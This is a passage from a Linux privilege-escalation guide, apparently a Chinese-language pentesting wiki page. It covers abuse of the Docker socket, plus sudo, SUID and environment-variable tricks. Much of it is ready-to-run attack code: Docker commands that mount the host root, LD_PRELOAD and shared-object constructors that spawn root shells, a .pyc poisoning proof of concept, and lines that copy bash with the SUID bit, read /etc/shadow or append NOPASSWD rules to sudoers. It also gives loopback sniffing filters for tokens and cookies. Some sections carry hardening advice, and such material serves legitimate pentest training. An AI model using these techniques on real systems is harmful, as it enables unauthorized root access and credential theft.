nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意，可能会有一些**监听 HTTP** 请求的 sockets（_我说的不是 .socket 文件，而是作为 unix sockets 运行的文件_）。你可以通过以下方式检查：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
如果 socket **响应 HTTP** 请求，那么你可以与它**通信**，并且也许可以**利用某些漏洞**。

### 可写 Docker Socket

Docker socket 通常位于 `/var/run/docker.sock`，这是一个需要保护的关键文件。默认情况下，它对 `root` 用户和 `docker` 组成员可写。拥有对这个 socket 的写入权限可能导致权限提升。下面说明如何做到这一点，以及如果 Docker CLI 不可用时的替代方法。

#### **使用 Docker CLI 进行权限提升**

如果你对 Docker socket 有写入权限，你可以使用以下命令提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，并以 root 级别访问主机的文件系统。

#### **Using Docker API Directly**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令来操作 Docker socket。

1.  **List Docker Images:** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求创建一个挂载主机系统根目录的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 建立到容器的连接，从而能够在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在设置好 `socat` 连接后，你就可以直接在容器中执行命令，并以 root 级别访问主机的文件系统。

### Others

请注意，如果你对 docker socket 有写权限，因为你**属于 `docker` 组**，你会有[**更多方式来提升权限**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API 正在某个端口监听**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)，你也可以尝试将其攻陷。

在以下内容中查看**更多从容器中逃逸或滥用 container runtimes 来提升权限的方法**：

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**你可能可以滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为**你可能可以滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 **inter-Process Communication (IPC)** 系统，能够让应用程序高效地交互并共享数据。它是为现代 Linux 系统设计的，为不同形式的应用程序通信提供了一个稳健的框架。

该系统用途广泛，支持基础的 IPC，增强进程间的数据交换，类似于**增强版 UNIX domain sockets**。此外，它还帮助广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth daemon 发出的来电信号可以让 music player 静音，从而提升用户体验。另外，D-Bus 还支持远程对象系统，简化应用程序之间的服务请求和方法调用，简化了传统上较为复杂的流程。

D-Bus 运行于一种 **allow/deny model**，根据匹配到的 policy rules 的累积效果来管理消息权限（method calls、signal emissions 等）。这些 policies 指定与 bus 的交互，可能会因这些权限被滥用而导致权限提升。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了一个此类 policy 的示例，其中详细说明了 root 用户对 `fi.w1.wpa_supplicant1` 的拥有、发送和接收消息权限。

未指定 user 或 group 的 policies 会普遍适用，而 "default" 上下文 policies 会应用于所有未被其他特定 policies 覆盖的内容。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里学习如何枚举并利用 D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并弄清机器所处位置总是很有意思。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### 出站过滤快速分流

如果主机可以运行命令但 callbacks 失败，快速区分 DNS、transport、proxy 和 route 过滤：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 打开的端口

在访问机器之前，始终检查你之前无法交互的正在机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
按 bind target 对 listeners 分类：

- `0.0.0.0` / `[::]`：暴露在所有本地 interfaces 上。
- `127.0.0.1` / `::1`：仅本地可访问（适合作为 tunnel/forward 候选）。
- 特定内部 IP（例如 `10.x`、`172.16/12`、`192.168.x`、`fe80::`）：通常只能从内部 segments 访问。

### Local-only service triage workflow

当你 compromise 一台主机时，绑定到 `127.0.0.1` 的 services 往往会第一次从你的 shell 中变得可访问。一个快速的本地 workflow 是：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS 作为 network scanner（network-only mode）

除了本地 PE checks，linPEAS 还可以作为一个专注的 network scanner 运行。它会使用 `$PATH` 中可用的 binaries（通常是 `fping`、`ping`、`nc`、`ncat`），并且不会安装 tooling。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
如果你在没有 `-t` 的情况下传入 `-d`、`-p` 或 `-i`，linPEAS 会作为纯网络扫描器运行（跳过其余的 privilege-escalation 检查）。

### Sniffing

检查你是否可以嗅探流量。如果可以，你可能能够获取一些凭证。
```
timeout 1 tcpdump
```
快速实用检查：
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) 在 post-exploitation 中尤其有价值，因为许多仅限内部使用的服务会在这里暴露 tokens/cookies/credentials：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
现在捕获，稍后解析：
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 用户

### 通用枚举

检查你是**谁**，你有什么**权限**，系统中有哪些**用户**，哪些用户可以**login**，以及哪些用户有**root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受到一个 bug 影响，该 bug 允许 **UID > INT_MAX** 的用户提升权限。更多信息：[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674)。\
使用 **`systemd-run -t /bin/bash`** 来 **利用它**

### Groups

检查你是否是某个可能赋予你 root 权限的 group 的 **member**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

检查 clipboard 中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道该环境中的任何密码**，请尝试使用该密码**以每个用户身份登录**。

### Su Brute

如果你不介意制造很多噪音，并且计算机上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 对用户进行暴力破解。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写 PATH 滥用

### $PATH

如果你发现自己可以**写入 $PATH 中的某个文件夹**，你也许可以通过**在该可写文件夹中创建后门**来提升权限；后门的名称应当是某个会被不同用户（理想情况下是 root）执行的命令，并且该命令**不会从位于你的可写文件夹之前的目录**中加载。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者它们可能具有 suid 位。使用以下方式检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些 **意外的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在只需在 root 目录中添加一个 ssh key，或者调用 `sh`，就可以很轻松地获得 shell。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些内容时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**基于 HTB 机器 Admirer**，在以 root 执行脚本时，**容易受到** **PYTHONPATH hijacking** 的影响，可以加载任意 python library：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### 可写的 `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

如果一个 **sudo-allowed Python script** 导入了某个模块，而该模块的包目录包含一个 **writable `__pycache__`**，你可能可以替换缓存的 `.pyc`，并在下一次导入时以特权用户身份获得 code execution。

- 为什么它有效：
- CPython 将 bytecode caches 存储在 `__pycache__/module.cpython-<ver>.pyc`。
- 解释器会验证 **header**（magic + 与 source 绑定的 timestamp/hash metadata），然后执行存储在该 header 后面的 marshaled code object。
- 如果你可以因为目录可写而 **delete and recreate** 这个缓存文件，那么一个 root-owned 但 non-writable 的 `.pyc` 仍然可以被替换。
- 典型路径：
- `sudo -l` 显示一个你可以以 root 运行的 Python script 或 wrapper。
- 该脚本从 `/opt/app/`、`/usr/local/lib/...` 等位置导入本地模块。
- 被导入模块的 `__pycache__` 目录对你的用户或对所有人可写。

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
如果你能检查特权脚本，识别导入的模块及其缓存路径：
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. 先运行一次被 sudo 允许的 script，这样 Python 会在尚不存在时创建合法的 cache 文件。
2. 从合法的 `.pyc` 中读取前 16 字节，并在被污染的文件中复用它们。
3. 编译一个 payload code object，`marshal.dumps(...)` 它，删除原始 cache 文件，然后用原始 header 加上你的恶意 bytecode 重新创建它。
4. 重新运行被 sudo 允许的 script，这样 import 就会以 root 身份执行你的 payload。

Important notes:

- 复用原始 header 是关键，因为 Python 检查的是 cache metadata 是否与 source file 匹配，而不是 bytecode body 是否真的和 source 相同。
- 当 source file 由 root 拥有且不可写，但包含它的 `__pycache__` directory 可写时，这一点尤其有用。
- 如果特权进程使用 `PYTHONDONTWRITEBYTECODE=1`，从安全权限的位置导入，或者移除了 import path 中每个 directory 的写权限，那么这个攻击就会失败。

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
加固：

- 确保特权 Python import path 中没有任何目录对低权限用户可写，包括 `__pycache__`。
- 对于特权运行，考虑设置 `PYTHONDONTWRITEBYTECODE=1`，并定期检查是否存在意外可写的 `__pycache__` 目录。
- 将可写的本地 Python modules 和可写的 cache 目录，按对待可写 shell scripts 或由 root 执行的共享 libraries 的方式来处理。

### 通过 sudo env_keep 保留的 BASH_ENV → root shell

如果 sudoers 保留了 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你就可以利用 Bash 的非交互式启动行为，在调用允许的 command 时以 root 身份执行任意代码。

- 原理：对于非交互式 shell，Bash 会在运行目标 script 之前先求值 `$BASH_ENV` 并 source 该文件。许多 sudo 规则允许运行 script 或 shell wrapper。如果 `BASH_ENV` 被 sudo 保留，那么你的文件会以 root 权限被 source。

- 要求：
- 一个你可以运行的 sudo rule（任何会非交互式调用 `/bin/bash` 的 target，或任何 bash script）。
- `BASH_ENV` 在 `env_keep` 中（用 `sudo -l` 检查）。

- PoC：
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固：
- 从 `env_keep` 中移除 `BASH_ENV`（以及 `ENV`），优先使用 `env_reset`。
- 避免对 sudo 允许的命令使用 shell wrapper；使用最小化 binaries。
- 考虑 sudo I/O logging，以及在使用保留的 env vars 时进行告警。

### Terraform via sudo with preserved HOME (!env_reset)

如果 sudo 保持环境不变（`!env_reset`）并且允许 `terraform apply`，`$HOME` 会保持为调用用户的值。因此 Terraform 会以 root 身份加载 **$HOME/.terraformrc**，并遵循 `provider_installation.dev_overrides`。

- 将所需的 provider 指向一个可写目录，并投放一个以该 provider 命名的恶意 plugin（例如，`terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 会在 Go plugin handshake 失败，但会在退出前以 root 执行 payload，留下一个 SUID shell。

### TF_VAR overrides + symlink validation bypass

Terraform 变量可以通过 `TF_VAR_<name>` 环境变量提供，而当 sudo 保留环境变量时，这些变量会保留下来。像 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的弱验证可以通过 symlinks 绕过：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **write** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### requiretty / !requiretty

On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
```bash
Defaults !requiretty
```
这本身并不是一个直接漏洞，但它扩展了可以滥用 sudo 规则的情况，而不需要完整的 PTY。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH` 或者 `secure_path` 包含攻击者可写的条目（例如 `/home/<user>/bin`），那么 sudo 允许目标中的任何相对命令都可以被 shadow。

- Requirements: 一个 sudo 规则（通常是 `NOPASSWD`）运行一个会调用不使用绝对路径的命令（`free`、`df`、`ps` 等）的 script/binary，并且有一个会被优先搜索的可写 PATH 条目。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行绕过路径
**Jump** 去读取其他文件或使用 **symlinks**。例如在 sudoers file 中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用了 **wildcard**（\*），那就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 没有 command path 的 Sudo command/SUID binary

如果 **sudo permission** 被赋予给一个单独的 command，**但没有指定 path**：_hacker10 ALL= (root) less_，你可以通过修改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
This technique can also be used if a **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 SUID binary 时，这个 function 将会被执行

### 可写 script 被 SUID wrapper 执行

一个常见的 custom-app misconfiguration 是 root 拥有的 SUID binary wrapper 执行一个 script，而这个 script 本身对低权限用户是可写的。

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
如果 `/usr/local/bin/backup.sh` 是可写的，你可以追加 payload 命令，然后执行 SUID wrapper：
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
快速检查：
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
这种攻击路径在 `/usr/local/bin` 中提供的 “maintenance”/“backup” wrappers 里尤其常见。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so files），由 loader 在其他所有库之前加载，包括标准 C library（`libc.so`）。这个过程称为 preloading 一个 library。

然而，为了维护系统安全并防止该特性被滥用，尤其是在 **suid/sgid** executables 中，系统会强制执行某些条件：

- 当可执行文件的 real user ID (_ruid_) 不等于 effective user ID (_euid_) 时，loader 会忽略 **LD_PRELOAD**。
- 对于 suid/sgid 可执行文件，只有位于标准路径中且本身也是 suid/sgid 的 library 才会被 preloaded。

如果你能够使用 `sudo` 执行命令，并且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，就可能发生 privilege escalation。这个配置允许 **LD_PRELOAD** 环境变量被保留，并在通过 `sudo` 运行命令时仍然生效，从而可能导致以提升后的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
Save as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **compile it** 使用：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**提升权限**运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** 环境变量，也可以滥用类似的 privesc，因为他控制了库文件的搜索路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so 注入

当遇到一个带有 **SUID** 权限且看起来不寻常的二进制文件时，最好确认它是否正确加载了 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明可能存在可利用的机会。

要利用这一点，可以先创建一个 C 文件，比如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过操纵文件权限并以提升后的权限执行 shell 来提升权限。

将上述 C 文件编译为共享对象（.so）文件，命令如下：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致 system compromise。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到一个 SUID binary 会从一个我们可写的 folder 加载 library，接下来就在那个 folder 里创建这个 library，使用必要的 name：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你收到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个经过整理的 Unix binaries 列表，攻击者可以利用它绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 也是类似的，但适用于你**只能在** command 中注入 arguments 的情况。

该项目收集了 Unix binaries 的合法功能，这些功能可以被滥用来突破受限 shell、提权或维持高权限、传输文件、生成 bind shell 和 reverse shell，以及执行其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，你可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任意 sudo 规则的方法。

### Reusing Sudo Tokens

在你有 **sudo access** 但没有密码的情况下，你可以通过**等待 sudo command 执行，然后劫持 session token** 来提权。

提权所需条件：

- 你已经获得了用户 "_sampleuser_" 的 shell
- "_sampleuser_" 在**过去 15 分钟内**曾使用过 **sudo** 执行某些操作（默认情况下，这就是允许我们在不输入密码的情况下使用 `sudo` 的 sudo token 持续时间）
- `cat /proc/sys/kernel/yama/ptrace_scope` 为 0
- `gdb` 可访问（你可以上传它）

（你可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久启用）

如果满足所有这些条件，你可以使用以下方式提权： [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **第一个 exploit** (`exploit.sh`) 会在 _/tmp_ 中创建 binary `activate_sudo_token`。你可以用它在你的 session 中**激活 sudo token**（不会自动得到 root shell，执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 第二个 **exploit** (`exploit_v2.sh`) 将在 _/tmp_ 中创建一个由 root 拥有并带有 setuid 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit**（`exploit_v3.sh`）会**创建一个 sudoers 文件**，使**sudo token 永久有效，并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你在该文件夹或该文件夹内创建的任何文件上有**写权限**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 为某个用户和 PID **创建一个 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且你有该用户的 shell，PID 为 1234，那么你可以在**不需要知道密码**的情况下**获得 sudo privileges**，方法如下：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 内的文件用于配置谁可以使用 `sudo` 以及如何使用。这些文件**默认只能被用户 root 和组 root 读取**。\
**如果**你可以**读取**这个文件，你可能能够**获取一些有趣的信息**，而如果你可以**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你可以写入，你就可以滥用这个权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方式：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制文件的工具，例如 OpenBSD 的 `doas`，记得检查其在 `/etc/doas.conf` 的配置
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

